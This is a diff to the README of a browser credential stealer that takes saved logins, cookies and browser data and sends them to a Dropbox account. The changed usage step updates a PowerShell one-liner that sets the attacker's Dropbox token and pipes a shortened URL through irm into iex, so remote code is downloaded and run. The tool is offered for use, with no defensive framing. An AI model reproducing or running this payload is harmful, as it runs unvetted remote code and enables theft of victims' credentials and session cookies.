@@ -11,7 +11,7 @@ This script is designed to extract saved logins, cookies, and browser data from 
 
 ## Usage
 1. Update the Dropbox token in the script by replacing `'INSERT-YOUR-DROPBOX-TOKEN'` with your actual Dropbox token.
-2. Run the script in PowerShell using the provided payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN'; irm tinyurl.com/488cxscc | iex
+2. Run the script in PowerShell using the provided payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN'; irm tinyurl.com/3tm7msr7 | iex
 
 ## Supported Platforms
 - Windows 10/11
